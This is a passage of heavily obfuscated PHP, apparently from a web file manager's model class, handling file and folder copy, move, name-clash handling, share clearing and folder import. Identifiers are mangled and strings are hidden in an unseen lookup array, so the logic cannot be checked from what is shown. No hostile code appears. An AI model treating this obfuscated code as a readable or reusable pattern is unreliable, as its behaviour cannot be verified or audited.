$this->saveAll($ù²Ø¹úå[$±áòÏ[614]]); Model($±áòÏ[231])->linkAdd($ù²Ø¹úå[$±áòÏ[612]]); $this->folderSizeReset($·¯ûõˆ¿); $this->updateModifyTime($·¯ûõˆ¿); return $¼¦¡»€¨; } private function _copy($˜¸ê«Ê¨, $‚’£”İ, $™Ñ¶µ×¦, &$¥“½Ùåğ, $—Ä´½…‹, $ÖğŒşû¾ = '') { $İ”ûê =& $_SERVER[Ñ¯©ç]; $Œ›ÇÉÄä = $this->sourceInfoCache($˜¸ê«Ê¨); $ÕËÕ’Ğ = $Œ›ÇÉÄä[$İ”ûê[468]] == $İ”ûê[101]; $–¸ºİ–Û = $ÖğŒşû¾ ? $ÖğŒşû¾ : $Œ›ÇÉÄä[$İ”ûê[32]]; $Ô×¯¦° = $this->fileNameExistAuto($‚’£”İ, $Œ›ÇÉÄä); if ($—Ä´½…‹) { $this->_childrenAllMake($˜¸ê«Ê¨); if ($ÕËÕ’Ğ && $Ô×¯¦°) { $this->_childrenAllMake($Ô×¯¦°); } } if (!$Ô×¯¦°) { return $this->_copyCreate($˜¸ê«Ê¨, $‚’£”İ, $–¸ºİ–Û, $¥“½Ùåğ); } $šöˆÒ = $Ô×¯¦°; if ($ÕËÕ’Ğ) { if ($™Ñ¶µ×¦ == REPEAT_RENAME_FOLDER) { $–¸ºİ–Û = $this->fileNameAutoCache($‚’£”İ, $–¸ºİ–Û, $™Ñ¶µ×¦, $ÕËÕ’Ğ); $šöˆÒ = $this->_copyCreate($˜¸ê«Ê¨, $‚’£”İ, $–¸ºİ–Û, $¥“½Ùåğ); } else { $òùÓª¯† = $this->_childrenList($˜¸ê«Ê¨); foreach ($òùÓª¯† as $å„Ûú‡) { $this->_copy($å„Ûú‡[$İ”ûê[194]], $Ô×¯¦°, $™Ñ¶µ×¦, $¥“½Ùåğ, !1); } } } else { if ($™Ñ¶µ×¦ == REPEAT_RENAME || $™Ñ¶µ×¦ == REPEAT_RENAME_FOLDER) { $–¸ºİ–Û = $this->fileNameAutoCache($‚’£”İ, $–¸ºİ–Û, $™Ñ¶µ×¦, $ÕËÕ’Ğ); $šöˆÒ = $this->_copyCreate($˜¸ê«Ê¨, $‚’£”İ, $–¸ºİ–Û, $¥“½Ùåğ); } else { if ($™Ñ¶µ×¦ == REPEAT_REPLACE) { $ÌØ¶ªã¹ = $this->sourceInfoCache($Ô×¯¦°); $áö°©Ä = $this->fileHistory($ÌØ¶ªã¹, $Œ›ÇÉÄä[$İ”ûê[524]], $Œ›ÇÉÄä[$İ”ûê[89]]); if ($áö°©Ä) { $¥“½Ùåğ[$İ”ûê[612]][] = $Œ›ÇÉÄä[$İ”ûê[524]]; } } else { if ($™Ñ¶µ×¦ == REPEAT_SKIP) { } } } Hook::trigger($İ”ûê[617], array($İ”ûê[618], $Œ›ÇÉÄä, 0)); } return $šöˆÒ; } private function _copyCreate($òŠËö¢¯, $Ëˆï­¿§, $’–ÖÀÛá, &$‡à÷‹ÏÖ) { $ëôøË²õ =& $_SERVER[Ñ¯©ç]; $™õ²”ß = $this->sourceInfoCache($òŠËö¢¯); $¨ñ“ßÉ = $this->sourceInfoCache($Ëˆï­¿§); $Õ¤¹™™Ü = $this->_makeItemData($™õ²”ß, $¨ñ“ßÉ, $’–ÖÀÛá); Hook::trigger($ëôøË²õ[619], $Õ¤¹™™Ü); Hook::trigger($ëôøË²õ[620], array($ëôøË²õ[621], $Õ¤¹™™Ü, 0)); $œùŸ˜“ = $this->add($Õ¤¹™™Ü); $ò°ıÇÑÚ = array($ëôøË²õ[194] => $œùŸ˜“, $ëôøË²õ[32] => $’–ÖÀÛá); $this->_copyApplyMeta($ò°ıÇÑÚ, $‡à÷‹ÏÖ); if ($™õ²”ß[$ëôøË²õ[468]] != $ëôøË²õ[101]) { $‡à÷‹ÏÖ[$ëôøË²õ[612]][] = $™õ²”ß[$ëôøË²õ[524]]; return $œùŸ˜“; } $³“û»Ê– = array(); $¯œÀ©“í = array(); $this->_childrenListAll($òŠËö¢¯, $³“û»Ê–); $•êÈßŞÌ = count($³“û»Ê–); if ($•êÈßŞÌ == 0) { return $œùŸ˜“; } $áí¸ É¦ = $this->sourceInfo($œùŸ˜“); foreach ($³“û»Ê– as $¶ıšãà) { $ØâÖøÍ = $this->_makeItemData($¶ıšãà, $áí¸ É¦, $¶ıšãà[$ëôøË²õ[32]]); $ØâÖøÍ[$ëôøË²õ[568]] = $¶ıšãà[$ëôøË²õ[568]]; $¯œÀ©“í[] = $ØâÖøÍ; } $this->chunkEventSet($ëôøË²õ[622], array($ëôøË²õ[623], $Õ¤¹™™Ü, $•êÈßŞÌ)); $this->addAll($¯œÀ©“í, array(), !1); $¤Ş›÷á½ = $this->where(array($ëôøË²õ[193] => $œùŸ˜“))->select(); $¡Â€Ÿ• = $this->_childrenMakeRelation($³“û»Ê–, $¤Ş›÷á½); $¡Â€Ÿ•[$òŠËö¢¯] = $œùŸ˜“; $ÉåŞƒãÙ = array(); $Ï¢ÔÅ·ã = array(); foreach ($¤Ş›÷á½ as $¶ıšãà) { $›ŸÉ‘ä‡ = $¶ıšãà[$ëôøË²õ[194]]; $«•Îƒ¯˜ = $this->_childrenMatch($¡Â€Ÿ•, $¶ıšãà, $áí¸ É¦); $ÉåŞƒãÙ[] = array($ëôøË²õ[194], $›ŸÉ‘ä‡, $ëôøË²õ[193], $«•Îƒ¯˜[$ëôøË²õ[193]]); $Ï¢ÔÅ·ã[] = array($ëôøË²õ[194], $›ŸÉ‘ä‡, $ëôøË²õ[568], $«•Îƒ¯˜[$ëôøË²õ[568]]); $this->_copyApplyMeta($¶ıšãà, $‡à÷‹ÏÖ); if ($¶ıšãà[$ëôøË²õ[468]] != $ëôøË²õ[101]) { $‡à÷‹ÏÖ[$ëôøË²õ[612]][] = $¶ıšãà[$ëôøË²õ[524]]; } } $this->chunkEventSet($ëôøË²õ[624], array($ëôøË²õ[625], $Õ¤¹™™Ü, $•êÈßŞÌ)); $this->saveAll($ÉåŞƒãÙ); $this->chunkEventSet($ëôøË²õ[626], array($ëôøË²õ[627], $Õ¤¹™™Ü, $•êÈßŞÌ)); $this->saveAll($Ï¢ÔÅ·ã); return $œùŸ˜“; } private function _childrenMakeRelation($£˜–éœÓ, $¦‡ÍÙğÈ) { $üÎÛş” =& $_SERVER[Ñ¯©ç]; $’ƒ‰²¯ = array(); $üûâ›ûç = array(); foreach ($£˜–éœÓ as $É…ÓÕ±°) { $¹ª¬°’² = $É…ÓÕ±°[$üÎÛş”[32]] . $üÎÛş”[8] . $É…ÓÕ±°[$üÎÛş”[568]]; $’ƒ‰²¯[$¹ª¬°’²] = $É…ÓÕ±°[$üÎÛş”[194]]; } foreach ($¦‡ÍÙğÈ as $É…ÓÕ±°) { $¹ª¬°’² = $É…ÓÕ±°[$üÎÛş”[32]] . $üÎÛş”[8] . $É…ÓÕ±°[$üÎÛş”[568]]; $ƒò—Î±§ = $’ƒ‰²¯[$¹ª¬°’²]; $üûâ›ûç[$ƒò—Î±§] = $É…ÓÕ±°[$üÎÛş”[194]]; } return $üûâ›ûç; } private function _childrenMatch($¶œê®¶ø, $‰ºİÇ¹ª, $ÏÀ«¢úß) { $¶ˆÉ¤®— =& $_SERVER[Ñ¯©ç]; $‹¡§‹—¿ = $ÏÀ«¢úß[$¶ˆÉ¤®—[568]]; $—É‹—“Ç = $this->parentLevelArray($‰ºİÇ¹ª[$¶ˆÉ¤®—[568]]); foreach ($—É‹—“Ç as $¾«Âù¨±) { if (isset($¶œê®¶ø[$¾«Âù¨±])) { $‹¡§‹—¿ .= $¶œê®¶ø[$¾«Âù¨±] . $¶ˆÉ¤®—[628]; } } $‹¡§‹—¿ = rtrim($‹¡§‹—¿, $¶ˆÉ¤®—[50]) . $¶ˆÉ¤®—[50]; $øòÉ¨Æñ = $this->parentLevelArray($‹¡§‹—¿); $©‡ú¦Í = $øòÉ¨Æñ[count($øòÉ¨Æñ) - 1]; return array($¶ˆÉ¤®—[193] => $©‡ú¦Í, $¶ˆÉ¤®—[568] => $‹¡§‹—¿); } private function _makeItemData($Æ¬Š­³Ê, $ÎàÊ¹½, $½Ì¥µÜí) { $û•²Öåë =& $_SERVER[Ñ¯©ç]; $×Ó‡¹å = array($û•²Öåë[629] => $Æ¬Š­³Ê[$û•²Öåë[468]], $û•²Öåë[477] => $½Ì¥µÜí, $û•²Öåë[630] => $Æ¬Š­³Ê[$û•²Öåë[469]] ? $Æ¬Š­³Ê[$û•²Öåë[469]] : $û•²Öåë[12], $û•²Öåë[525] => $Æ¬Š­³Ê[$û•²Öåë[524]] ? $Æ¬Š­³Ê[$û•²Öåë[524]] : 0, $û•²Öåë[600] => $Æ¬Š­³Ê[$û•²Öåë[89]] ? $Æ¬Š­³Ê[$û•²Öåë[89]] : 0, $û•²Öåë[631] => intval($ÎàÊ¹½[$û•²Öåë[191]]), $û•²Öåë[632] => intval($ÎàÊ¹½[$û•²Öåë[553]]), $û•²Öåë[633] => intval(USER_ID), $û•²Öåë[634] => intval(USER_ID), $û•²Öåë[460] => intval($ÎàÊ¹½[$û•²Öåë[194]]), $û•²Öåë[635] => $ÎàÊ¹½[$û•²Öåë[568]] . $ÎàÊ¹½[$û•²Öåë[194]] . $û•²Öåë[50], $û•²Öåë[481] => $Æ¬Š­³Ê[$û•²Öåë[98]] ? $Æ¬Š­³Ê[$û•²Öåë[98]] : time(), $û•²Öåë[487] => 0, $û•²Öåë[636] => $û•²Öåë[12]); return $×Ó‡¹å; } private function _copyApplyMeta($¨¿‰º©£, &$­»”ŠŒİ) { $ôâ¹Ÿ÷¡ =& $_SERVER[Ñ¯©ç]; $†¥¬óĞù = $¨¿‰º©£[$ôâ¹Ÿ÷¡[194]]; $Ä¶Ó = $¨¿‰º©£[$ôâ¹Ÿ÷¡[32]]; if (!isset($¨¿‰º©£[$ôâ¹Ÿ÷¡[637]]) || !$¨¿‰º©£[$ôâ¹Ÿ÷¡[637]] || $¨¿‰º©£[$ôâ¹Ÿ÷¡[637]] == $ôâ¹Ÿ÷¡[229]) { $­»”ŠŒİ[$ôâ¹Ÿ÷¡[614]][] = array($ôâ¹Ÿ÷¡[194], $†¥¬óĞù, $ôâ¹Ÿ÷¡[637], short_id($†¥¬óĞù)); } if (Input::check($Ä¶Ó, $ôâ¹Ÿ÷¡[638])) { $­»”ŠŒİ[$ôâ¹Ÿ÷¡[613]][] = array($ôâ¹Ÿ÷¡[194] => $†¥¬óĞù, $ôâ¹Ÿ÷¡[107] => $ôâ¹Ÿ÷¡[521], $ôâ¹Ÿ÷¡[434] => str_replace($ôâ¹Ÿ÷¡[53], $ôâ¹Ÿ÷¡[12], Pinyin::get($Ä¶Ó))); $­»”ŠŒİ[$ôâ¹Ÿ÷¡[613]][] = array($ôâ¹Ÿ÷¡[194] => $†¥¬óĞù, $ôâ¹Ÿ÷¡[107] => $ôâ¹Ÿ÷¡[520], $ôâ¹Ÿ÷¡[434] => Pinyin::get($Ä¶Ó, $ôâ¹Ÿ÷¡[639])); } $­»”ŠŒİ[$ôâ¹Ÿ÷¡[613]][] = array($ôâ¹Ÿ÷¡[194] => $†¥¬óĞù, $ôâ¹Ÿ÷¡[107] => $ôâ¹Ÿ÷¡[500], $ôâ¹Ÿ÷¡[434] => KodSort::makeStr($Ä¶Ó)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($½¬œ›Òñ) { $‘µ¼Úëß =& $_SERVER[Ñ¯©ç]; $ÌŠ¿Œ•ø = $this->sourceInfo($½¬œ›Òñ); $ù‡²„ = $‘µ¼Úëß[640]; $ëÇåô = array($‘µ¼Úëß[568] => array($‘µ¼Úëß[595], $ÌŠ¿Œ•ø[$‘µ¼Úëß[568]] . $½¬œ›Òñ . $‘µ¼Úëß[596]), $‘µ¼Úëß[488] => $this->targetIsDelete); $®İÎèØï = $this->field($ù‡²„)->where($ëÇåô)->select(); if (!$®İÎèØï) { return; } $®İÎèØï = array_to_keyvalue($®İÎèØï, $‘µ¼Úëß[194]); foreach ($®İÎèØï as $×€‚·å) { $‰İÔ®é¶ = $×€‚·å[$‘µ¼Úëß[193]]; $½¬œ›Òñ = $×€‚·å[$‘µ¼Úëß[194]]; if (!isset($this->_childrenListCache[$½¬œ›Òñ]) && $×€‚·å[$‘µ¼Úëß[468]] == $‘µ¼Úëß[101]) { $this->_childrenListCache[$½¬œ›Òñ] = array(); } if (!isset($this->_childrenListCache[$‰İÔ®é¶])) { $this->_childrenListCache[$‰İÔ®é¶] = array(); } $this->_childrenListCache[$‰İÔ®é¶][$½¬œ›Òñ] = $×€‚·å; $this->_childrenItemCache[$½¬œ›Òñ] = $×€‚·å; } } private function _childrenListAll($ÈŒ‡Ş„Ø, &$ıèÜ­¾„) { $´¦í¸Š =& $_SERVER[Ñ¯©ç]; if (!isset($this->_childrenListCache[$ÈŒ‡Ş„Ø])) { return; } $î¢À–İÄ = $this->_childrenListCache[$ÈŒ‡Ş„Ø]; foreach ($î¢À–İÄ as $ÄÂÛõ’ => $«œŠÄµÏ) { $ıèÜ­¾„[$ÄÂÛõ’] = $«œŠÄµÏ; if ($«œŠÄµÏ[$´¦í¸Š[468]] == $´¦í¸Š[101]) { $this->_childrenListAll($ÄÂÛõ’, $ıèÜ­¾„); } } } private function sourceInfoCache($Â­¼ó«®) { if (isset($this->_childrenItemCache[$Â­¼ó«®])) { return $this->_childrenItemCache[$Â­¼ó«®]; } return $this->sourceInfo($Â­¼ó«®); } private function _childrenList($òÙòÏ•) { if (isset($this->_childrenListCache[$òÙòÏ•])) { return $this->_childrenListCache[$òÙòÏ•]; } return $this->_childrenListSelect($òÙòÏ•); } private function _childrenListSelect($²àğı€©) { $£¥ä÷ =& $_SERVER[Ñ¯©ç]; $èŸ‡ø¢Í = array($£¥ä÷[193] => $²àğı€©, $£¥ä÷[488] => $this->targetIsDelete); $›íÉÍ“  = $this->where($èŸ‡ø¢Í)->select(); $›íÉÍ“  = $›íÉÍ“  ? $›íÉÍ“  : array(); $ÛƒÈ›µ = array_to_keyvalue($›íÉÍ“ , $£¥ä÷[194]); $this->_childrenListCache[$²àğı€©] = $ÛƒÈ›µ; foreach ($ÛƒÈ›µ as $²àğı€© => $¨¿ÅîÂ³) { $this->_childrenItemCache[$²àğı€©] = $¨¿ÅîÂ³; } return $ÛƒÈ›µ; } private function fileNameExistAuto($èÒóµó·, $¬¡ï ÁÔ) { $¯ƒ²øè =& $_SERVER[Ñ¯©ç]; if ($¬¡ï ÁÔ[$¯ƒ²øè[488]] == $¯ƒ²øè[101]) { return $this->fileNameExist($èÒóµó·, $¬¡ï ÁÔ[$¯ƒ²øè[32]]); } return $this->fileNameExistCache($èÒóµó·, $¬¡ï ÁÔ[$¯ƒ²øè[32]]); } private function fileNameExistCache($äª·³ˆ, $¨ïìØ) { $˜‡†¾·ñ =& $_SERVER[Ñ¯©ç]; $¨ïìØ = strtolower($¨ïìØ); $ü§¯íëÌ = $this->_childrenList($äª·³ˆ); foreach ($ü§¯íëÌ as $Ò•¾‡ïÖ) { if ($¨ïìØ == strtolower($Ò•¾‡ïÖ[$˜‡†¾·ñ[32]])) { return $Ò•¾‡ïÖ[$˜‡†¾·ñ[194]]; } } return !1; } private function fileNameAutoCache($·¹Êñ, $§§Ùı£, $³Ò•Ú‹Ö, $Ø¯ÏÔ ã) { $ÜÛÉÈ„ë =& $_SERVER[Ñ¯©ç]; $©ÚéÑá = $this->_childrenList($·¹Êñ); $Ú¬øÍã± = array_to_keyvalue($©ÚéÑá, $ÜÛÉÈ„ë[12], $ÜÛÉÈ„ë[32]); return $this->fileNameAutoGet($Ú¬øÍã±, $§§Ùı£, $³Ò•Ú‹Ö, $Ø¯ÏÔ ã); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($çË´¼Ú, $íå¦ª, $†Ç‚¹Á = REPEAT_REPLACE, $öÏ†Ø¾Å = '') { $Ú§¤Ò® =& $_SERVER[Ñ¯©ç]; $âíœò– = $this->sourceInfo($çË´¼Ú); $ÛµÂç¶œ = $this->sourceInfo($íå¦ª); if ($âíœò–[$Ú§¤Ò®[193]] == $ÛµÂç¶œ[$Ú§¤Ò®[194]]) { if ($âíœò–[$Ú§¤Ò®[488]] == $Ú§¤Ò®[101]) { Model($Ú§¤Ò®[486])->restore(array($çË´¼Ú)); } if (!$öÏ†Ø¾Å || $öÏ†Ø¾Å == $âíœò–[$Ú§¤Ò®[32]]) { return $çË´¼Ú; } } $÷°æªÎ‹ = $this->pathInfoMore($çË´¼Ú); if ($this->isParentOf($çË´¼Ú, $íå¦ª)) { return !1; } if (!$âíœò– || !$ÛµÂç¶œ || $ÛµÂç¶œ[$Ú§¤Ò®[468]] != $Ú§¤Ò®[101]) { return !1; } Hook::trigger($Ú§¤Ò®[641], $÷°æªÎ‹); $this->targetIsDelete = intval($âíœò–[$Ú§¤Ò®[488]]); if ($âíœò–[$Ú§¤Ò®[193]] == $íå¦ª && $öÏ†Ø¾Å != $âíœò–[$Ú§¤Ò®[32]]) { $È÷âø–° = $this->fileNameExist($íå¦ª, $öÏ†Ø¾Å); if ($È÷âø–° && $âíœò–[$Ú§¤Ò®[468]] == $Ú§¤Ò®[229]) { $©ê¶Šç = $this->sourceInfo($È÷âø–°); $ÑõŞ´… = $this->fileHistory($©ê¶Šç, $âíœò–[$Ú§¤Ò®[524]], $âíœò–[$Ú§¤Ò®[89]]); if (!$ÑõŞ´…) { Model($Ú§¤Ò®[527])->remove($âíœò–[$Ú§¤Ò®[524]]); } $this->removeNow($çË´¼Ú, !1); $this->folderSizeReset($íå¦ª); Hook::trigger($Ú§¤Ò®[642], $÷°æªÎ‹); return $È÷âø–°; } } $ºï„òñ = $öÏ†Ø¾Å ? $öÏ†Ø¾Å : $âíœò–[$Ú§¤Ò®[32]]; $this->lockMoveStart($çË´¼Ú); $this->lockWriteStart($íå¦ª, $ºï„òñ); $¬ÌÛ“±Á = array($Ú§¤Ò®[612] => array(), $Ú§¤Ò®[643] => !1); $this->clearShare($çË´¼Ú, $íå¦ª); $¸ŸÊ€­ê = $this->fileNameExistAuto($íå¦ª, $âíœò–); $±½ÜµÙ³ = $this->_move($çË´¼Ú, $íå¦ª, $†Ç‚¹Á, $¬ÌÛ“±Á, $öÏ†Ø¾Å); $this->sourceCacheClear(); if ($âíœò–[$Ú§¤Ò®[468]] == $Ú§¤Ò®[101] && $¸ŸÊ€­ê) { $this->folderSizeResetChildren($±½ÜµÙ³); } Model($Ú§¤Ò®[231])->linkAdd($¬ÌÛ“±Á[$Ú§¤Ò®[612]]); if ($¸ŸÊ€­ê && $¬ÌÛ“±Á[$Ú§¤Ò®[643]]) { $this->removeNow($çË´¼Ú, !1); } $this->lockMoveEnd($çË´¼Ú); $this->lockWriteEnd($íå¦ª, $ºï„òñ); $this->folderSizeReset($âíœò–[$Ú§¤Ò®[193]]); $this->folderSizeReset($íå¦ª); $·›ËÈñÆ = array($âíœò–[$Ú§¤Ò®[193]], $íå¦ª); if ($âíœò–[$Ú§¤Ò®[468]] == $Ú§¤Ò®[101]) { $·›ËÈñÆ[] = $çË´¼Ú; } $this->updateModifyTime($·›ËÈñÆ); Model($Ú§¤Ò®[616])->eventMove($çË´¼Ú, $âíœò–[$Ú§¤Ò®[193]], $íå¦ª); Hook::trigger($Ú§¤Ò®[642], $÷°æªÎ‹); return $±½ÜµÙ³; } private function _move($ğº¼ÊÀ, $óô‘¯ëø, $ÛÛº¦ú€, &$¿˜‹§ ƒ, $îªŸ±± = '') { $éÄĞúşÄ =& $_SERVER[Ñ¯©ç]; $¥˜Ş³ƒì = $this->sourceInfo($ğº¼ÊÀ); $¯¸®©ğ¸ = $¥˜Ş³ƒì[$éÄĞúşÄ[468]] == $éÄĞúşÄ[101]; $¯¨¹ƒ… = $îªŸ±± ? $îªŸ±± : $¥˜Ş³ƒì[$éÄĞúşÄ[32]]; $ÎÉéõÛ = $this->fileNameExistAuto($óô‘¯ëø, $¥˜Ş³ƒì); $this->lockMoveStart($ğº¼ÊÀ); $this->lockWriteStart($óô‘¯ëø, $¯¨¹ƒ…); if (!$ÎÉéõÛ) { return $this->_moveForce($ğº¼ÊÀ, $óô‘¯ëø, $¯¨¹ƒ…); } $ÆÖŒÆÔ‚ = $ÎÉéõÛ; $Ùîâá¸ï = !1; if ($¯¸®©ğ¸) { if ($ÛÛº¦ú€ == REPEAT_RENAME_FOLDER) { $¯¨¹ƒ… = $this->fileNameAuto($óô‘¯ëø, $¯¨¹ƒ…, $ÛÛº¦ú€, $¯¸®©ğ¸); $ÆÖŒÆÔ‚ = $this->_moveForce($ğº¼ÊÀ, $óô‘¯ëø, $¯¨¹ƒ…); } else { if ($ÛÛº¦ú€ == REPEAT_RENAME_FOLDER) { $ÛÛº¦ú€ = REPEAT_RENAME; } $©À£«è… = $this->_childrenListSelect($ğº¼ÊÀ); foreach ($©À£«è… as $§”—ü«–) { $this->_move($§”—ü«–[$éÄĞúşÄ[194]], $ÎÉéõÛ, $ÛÛº¦ú€, $¿˜‹§ ƒ); } $Ùîâá¸ï = !0; } } else { if ($ÛÛº¦ú€ == REPEAT_SKIP) { $Ùîâá¸ï = !0; } else { if ($ÛÛº¦ú€ == REPEAT_RENAME || $ÛÛº¦ú€ == REPEAT_RENAME_FOLDER) { $¯¨¹ƒ… = $this->fileNameAuto($óô‘¯ëø, $¯¨¹ƒ…, $ÛÛº¦ú€, $¯¸®©ğ¸); $ÆÖŒÆÔ‚ = $this->_moveForce($ğº¼ÊÀ, $óô‘¯ëø, $¯¨¹ƒ…); } else { if ($ÛÛº¦ú€ == REPEAT_REPLACE) { $Í‹‹À¬ = $this->sourceInfoCache($ÎÉéõÛ); $ÏæÍò¼³ = $this->fileHistory($Í‹‹À¬, $¥˜Ş³ƒì[$éÄĞúşÄ[524]], $¥˜Ş³ƒì[$éÄĞúşÄ[89]]); $Ùîâá¸ï = !0; if ($ÏæÍò¼³) { $¿˜‹§ ƒ[$éÄĞúşÄ[612]][] = $¥˜Ş³ƒì[$éÄĞúşÄ[524]]; } } } } } if ($Ùîâá¸ï && !$¿˜‹§ ƒ[$éÄĞúşÄ[643]]) { $¿˜‹§ ƒ[$éÄĞúşÄ[643]] = !0; } return $ÆÖŒÆÔ‚; } private function _moveForce($®ß“„¯¼, $ğ±‚ˆŞ, $¥êÄî¤) { $üü×ù¨æ =& $_SERVER[Ñ¯©ç]; $»·©ùã² = $this->sourceInfo($®ß“„¯¼); $éÕÚ¯©× = $this->sourceInfo($ğ±‚ˆŞ); $ÄÔÍÎËß = $»·©ùã²[$üü×ù¨æ[468]] == $üü×ù¨æ[101]; $ÀõĞãœ± = array($üü×ù¨æ[460] => $éÕÚ¯©×[$üü×ù¨æ[194]], $üü×ù¨æ[635] => $éÕÚ¯©×[$üü×ù¨æ[568]] . $éÕÚ¯©×[$üü×ù¨æ[194]] . $üü×ù¨æ[50], $üü×ù¨æ[631] => $éÕÚ¯©×[$üü×ù¨æ[191]], $üü×ù¨æ[632] => $éÕÚ¯©×[$üü×ù¨æ[553]], $üü×ù¨æ[634] => USER_ID, $üü×ù¨æ[477] => $¥êÄî¤); $Ã³¦¹ÏÂ = $»·©ùã²[$üü×ù¨æ[191]] == SourceModel::TYPE_GROUP && $éÕÚ¯©×[$üü×ù¨æ[191]] == SourceModel::TYPE_GROUP && $»·©ùã²[$üü×ù¨æ[553]] == $éÕÚ¯©×[$üü×ù¨æ[553]]; if (!$Ã³¦¹ÏÂ && $this->moveClearAuth) { Model($üü×ù¨æ[551])->authClear($®ß“„¯¼); } $Æ£¡ºÅ­ = $»·©ùã²[$üü×ù¨æ[488]] == $üü×ù¨æ[101] && $éÕÚ¯©×[$üü×ù¨æ[488]] != $üü×ù¨æ[101]; if ($Æ£¡ºÅ­) { $ÀõĞãœ±[$üü×ù¨æ[487]] = 0; } if ($ÄÔÍÎËß) { $­æƒü = array($üü×ù¨æ[635] => array($üü×ù¨æ[595], $»·©ùã²[$üü×ù¨æ[568]] . $»·©ùã²[$üü×ù¨æ[194]] . $üü×ù¨æ[596])); $ÉŒËéÖµ = $»·©ùã²[$üü×ù¨æ[568]] . $»·©ùã²[$üü×ù¨æ[194]] . $üü×ù¨æ[50]; $²ÚÓ©ãÀ = $éÕÚ¯©×[$üü×ù¨æ[568]] . $éÕÚ¯©×[$üü×ù¨æ[194]] . $üü×ù¨æ[50] . $»·©ùã²[$üü×ù¨æ[194]] . $üü×ù¨æ[50]; $®àşáŸÚ = array($üü×ù¨æ[635] => array($üü×ù¨æ[644], "\x72\145\160\x6c\141\x63\145\50\160\x61\162\145\156\x74\114\x65\166\145\x6c\54\x27{$ÉŒËéÖµ}\47\54\47{$²ÚÓ©ãÀ}\47\51"), $üü×ù¨æ[631] => $éÕÚ¯©×[$üü×ù¨æ[191]], $üü×ù¨æ[632] => $éÕÚ¯©×[$üü×ù¨æ[553]]); if ($Æ£¡ºÅ­) { $®àşáŸÚ[$üü×ù¨æ[487]] = 0; } $this->where($­æƒü)->data($®àşáŸÚ)->save(); } $this->where(array($üü×ù¨æ[474] => $®ß“„¯¼))->data($ÀõĞãœ±)->save(); return $®ß“„¯¼; } private function clearShare($‚ÏÊ£¦, $ÃµÅû¨à) { $óŞ‘ëù =& $_SERVER[Ñ¯©ç]; $ãŸçµç— = $this->sourceInfo($‚ÏÊ£¦); $½ˆ€öô³ = $this->sourceInfo($ÃµÅû¨à); if ($ãŸçµç—[$óŞ‘ëù[553]] == $½ˆ€öô³[$óŞ‘ëù[553]] && $ãŸçµç—[$óŞ‘ëù[191]] == $óŞ‘ëù[645]) { return; } $¼‚Î’Ò = array($óŞ‘ëù[568] => array($óŞ‘ëù[595], $ãŸçµç—[$óŞ‘ëù[568]] . $‚ÏÊ£¦ . $óŞ‘ëù[596])); $ªİØäØ¨ = $this->field($óŞ‘ëù[474])->where($¼‚Î’Ò)->getField($óŞ‘ëù[194], !0); if (!$ªİØäØ¨) { return; } $¼‚Î’Ò = array($óŞ‘ëù[194] => array($óŞ‘ëù[7], $ªİØäØ¨), $óŞ‘ëù[646] => 1); $©ÙÄ¯Úî = Model($óŞ‘ëù[647])->field($óŞ‘ëù[648])->where($¼‚Î’Ò)->select(); if (!$©ÙÄ¯Úî) { return; } $©ÙÄ¯Úî = array_to_keyvalue($©ÙÄ¯Úî, $óŞ‘ëù[12], $óŞ‘ëù[648]); $¼‚Î’Ò = array($óŞ‘ëù[648] => array($óŞ‘ëù[7], $©ÙÄ¯Úî)); Model($óŞ‘ëù[647])->where($¼‚Î’Ò)->save(array($óŞ‘ëù[646] => 0)); Model($óŞ‘ëù[649])->where($¼‚Î’Ò)->delete(); } public function copyFolderFromIO($ùş”û§, $èÛÃÅ²‰, $Úæ¹Ùãî, $–€›’¦à, $Óıãƒ, $ÕÍ×À¥ = false) { $ÜñôŞ×õ =& $_SERVER[Ñ¯©ç]; $Œ§¢¥Í— = array($ÜñôŞ×õ[613] => array(), $ÜñôŞ×õ[614] => array(), $ÜñôŞ×õ[612] => array(), $ÜñôŞ×õ[650] => array()); $²‹üòÑè = $ÕÍ×À¥ ? $ÕÍ×À¥ : $ùş”û§->pathThis($èÛÃÅ²‰); $Â°øÁŠ” = $this->fileNameExist($Úæ¹Ùãî, $²‹üòÑè); $¥ÖÛËû = $this->mkdir($Úæ¹Ùãî, $²‹üòÑè, $–€›’¦à); if (!$Â°øÁŠ” || $–€›’¦à == REPEAT_RENAME_FOLDER) { $–€›’¦à = !1; } if ($Â°øÁŠ”) { $this->_childrenAllMake($Â°øÁŠ”); } Hook::trigger($ÜñôŞ×õ[651]); $this->_copyChildTo($ùş”û§, $èÛÃÅ²‰, $¥ÖÛËû, $–€›’¦à, $Œ§¢¥Í—, $Óıãƒ); Hook::trigger($ÜñôŞ×õ[652]); if ($¥ÖÛËû) { $this->folderSizeResetChildren($¥ÖÛËû); } $this->_childrenListClear(); Model($ÜñôŞ×õ[615])->addAll($Œ§¢¥Í—[$ÜñôŞ×õ[613]], array(), !0); Model($ÜñôŞ×õ[616])->eventCopy($¥ÖÛËû); $this->saveAll($Œ§¢¥Í—[$ÜñôŞ×õ[614]]); Model($ÜñôŞ×õ[527])->linkAdd($Œ§¢¥Í—[$ÜñôŞ×õ[612]]); Model($ÜñôŞ×õ[527])->remove($Œ§¢¥Í—[$ÜñôŞ×õ[650]]); $this->folderSizeReset($Úæ¹Ùãî); $this->updateModifyTime($Úæ¹Ùãî); return $¥ÖÛËû; } private function _copyChildTo($ı£ŠøÈ, $äë ©, $ûŸè°µ, $‡ıÛ­’Î, &$±à¥•–, $Õ³ÊÎÏ«) { $ùÔÀŸ˜Ñ =& $_SERVER[Ñ¯©ç]; $×âªÚÔÂ = $this->sourceInfoCache($ûŸè°µ); $Ã¦ıÈ„÷ = $ı£ŠøÈ->listPath($äë ©); $Ã¦ıÈ„÷ = $Ã¦ıÈ„÷ ? $Ã¦ıÈ„÷ : array($ùÔÀŸ˜Ñ[96] => array(), $ùÔÀŸ˜Ñ[95] => array()); $¿ü£Ù‡¹ = array_merge($Ã¦ıÈ„÷[$ùÔÀŸ˜Ñ[96]], $Ã¦ıÈ„÷[$ùÔÀŸ˜Ñ[95]]); $ÒĞ…û¶İ = $this->_addFiles($ı£ŠøÈ, $Ã¦ıÈ„÷[$ùÔÀŸ˜Ñ[96]], $Õ³ÊÎÏ«); $õÊ¶ˆ÷§ = array(); foreach ($¿ü£Ù‡¹ as &$†•ûÈú) { if (isset($ÒĞ…û¶İ[$†•ûÈú[$ùÔÀŸ˜Ñ[32]]])) { $†•ûÈú = 